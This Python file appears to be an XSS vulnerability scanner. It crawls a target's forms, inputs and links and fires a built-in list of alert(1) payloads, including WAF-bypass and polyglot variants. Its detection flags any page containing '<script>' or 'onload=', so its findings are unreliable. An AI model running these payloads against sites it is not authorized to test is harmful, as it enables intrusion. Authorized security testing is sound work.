#!/usr/bin/env python3

import requests
import re
import json
import logging
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from typing import List, Dict, Set, Optional
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
import colorama
from colorama import Fore, Style

# Initialize colorama
colorama.init()

class XSSScanner:
    def __init__(self, target_url: str, config: Dict = None):
        self.target_url = target_url
        self.config = config or {}
        self.session = requests.Session()
        self.vulnerabilities = []
        self.visited_urls = set()
        self.setup_logging()

    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('xss_scan.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

    def load_payloads(self) -> List[str]:
        """Load XSS payloads from different categories"""
        payloads = []
        
        # Basic XSS payloads
        basic_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '"><svg/onload=alert(1)>',
            'javascript:alert(1)',
        ]
        
        # DOM-based XSS payloads
        dom_payloads = [
            '"><img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
            '"><svg/onload=eval(atob("YWxlcnQoMSk="))>',
            '"><script>eval(atob("YWxlcnQoMSk="))</script>',
        ]
        
        # WAF bypass payloads
        waf_bypass_payloads = [
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<scr\x00ipt>alert(1)</scr\x00ipt>',
            '<scr\x0Aipt>alert(1)</scr\x0Aipt>',
            '<scr\x0Dipt>alert(1)</scr\x0Dipt>',
            '<scr\x09ipt>alert(1)</scr\x09ipt>',
        ]
        
        # Event-based XSS payloads
        event_payloads = [
            '"><img src=x onerror=alert(1)>',
            '"><body onload=alert(1)>',
            '"><input onfocus=alert(1) autofocus>',
            '"><select onmouseover=alert(1)>',
        ]
        
        # Polyglot XSS payloads
        polyglot_payloads = [
            'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//<stYle/onload=alert()>//',
            '"><img src=x onerror=alert(1)><img src=x onerror=alert(1)>',
        ]
        
        payloads.extend(basic_payloads)
        payloads.extend(dom_payloads)
        payloads.extend(waf_bypass_payloads)
        payloads.extend(event_payloads)
        payloads.extend(polyglot_payloads)
        
        return payloads

    def scan_url(self, url: str) -> None:
        """Scan a single URL for XSS vulnerabilities"""
        if url in self.visited_urls:
            return
        
        self.visited_urls.add(url)
        self.logger.info(f"Scanning URL: {url}")
        
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all forms
            forms = soup.find_all('form')
            for form in forms:
                self.test_form_xss(url, form)
            
            # Find all input fields
            inputs = soup.find_all('input')
            for input_field in inputs:
                self.test_input_xss(url, input_field)
            
            # Find all links
            links = soup.find_all('a')
            for link in links:
                self.test_link_xss(url, link)
                
        except Exception as e:
            self.logger.error(f"Error scanning {url}: {str(e)}")

    def test_form_xss(self, url: str, form: BeautifulSoup) -> None:
        """Test form for XSS vulnerabilities"""
        form_action = form.get('action', '')
        form_method = form.get('method', 'get').lower()
        
        if not form_action:
            form_action = url
            
        form_url = urljoin(url, form_action)
        
        for payload in self.load_payloads():
            try:
                if form_method == 'get':
                    response = self.session.get(form_url, params={payload: payload})
                else:
                    response = self.session.post(form_url, data={payload: payload})
                
                if self.check_xss_success(response, payload):
                    self.report_vulnerability(url, 'form', payload, response)
                    
            except Exception as e:
                self.logger.error(f"Error testing form XSS: {str(e)}")

    def test_input_xss(self, url: str, input_field: BeautifulSoup) -> None:
        """Test input field for XSS vulnerabilities"""
        input_name = input_field.get('name', '')
        if not input_name:
            return
            
        for payload in self.load_payloads():
            try:
                response = self.session.get(url, params={input_name: payload})
                if self.check_xss_success(response, payload):
                    self.report_vulnerability(url, 'input', payload, response)
                    
            except Exception as e:
                self.logger.error(f"Error testing input XSS: {str(e)}")

    def test_link_xss(self, url: str, link: BeautifulSoup) -> None:
        """Test link for XSS vulnerabilities"""
        href = link.get('href', '')
        if not href:
            return
            
        for payload in self.load_payloads():
            try:
                test_url = urljoin(url, href)
                response = self.session.get(test_url, params={'test': payload})
                if self.check_xss_success(response, payload):
                    self.report_vulnerability(url, 'link', payload, response)
                    
            except Exception as e:
                self.logger.error(f"Error testing link XSS: {str(e)}")

    def check_xss_success(self, response: requests.Response, payload: str) -> bool:
        """Check if XSS payload was successful"""
        # Check for reflected payload
        if payload in response.text:
            return True
            
        # Check for common XSS indicators
        xss_indicators = [
            '<script>',
            'alert(',
            'onerror=',
            'onload=',
            'javascript:',
        ]
        
        for indicator in xss_indicators:
            if indicator in response.text:
                return True
                
        return False

    def report_vulnerability(self, url: str, vuln_type: str, payload: str, response: requests.Response) -> None:
        """Report found vulnerability"""
        vulnerability = {
            'url': url,
            'type': vuln_type,
            'payload': payload,
            'response_length': len(response.text),
            'status_code': response.status_code,
        }
        
        self.vulnerabilities.append(vulnerability)
        self.logger.warning(f"{Fore.RED}[!] Found XSS vulnerability in {url} ({vuln_type}){Style.RESET_ALL}")
        self.logger.warning(f"Payload: {payload}")

    def generate_report(self) -> None:
        """Generate a detailed report of found vulnerabilities"""
        if not self.vulnerabilities:
            print(f"{Fore.GREEN}[+] No XSS vulnerabilities found{Style.RESET_ALL}")
            return
            
        print(f"\n{Fore.YELLOW}[*] XSS Scan Report{Style.RESET_ALL}")
        print("=" * 50)
        
        for vuln in self.vulnerabilities:
            print(f"\n{Fore.RED}[!] Vulnerability Found{Style.RESET_ALL}")
            print(f"URL: {vuln['url']}")
            print(f"Type: {vuln['type']}")
            print(f"Payload: {vuln['payload']}")
            print(f"Response Length: {vuln['response_length']}")
            print(f"Status Code: {vuln['status_code']}")
            print("-" * 50)
            
        # Save report to file
        with open('xss_report.json', 'w') as f:
            json.dump(self.vulnerabilities, f, indent=4)
            
        print(f"\n{Fore.GREEN}[+] Report saved to xss_report.json{Style.RESET_ALL}")

    def start_scan(self) -> None:
        """Start the XSS scanning process"""
        print(f"{Fore.CYAN}[*] Starting XSS scan for {self.target_url}{Style.RESET_ALL}")
        
        try:
            self.scan_url(self.target_url)
            self.generate_report()
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Scan interrupted by user{Style.RESET_ALL}")
            self.generate_report()
            
        except Exception as e:
            self.logger.error(f"Error during scan: {str(e)}")
            self.generate_report()

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Advanced XSS Vulnerability Scanner')
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('--config', help='Path to configuration file')
    
    args = parser.parse_args()
    
    scanner = XSSScanner(args.url)
    scanner.start_scan() 
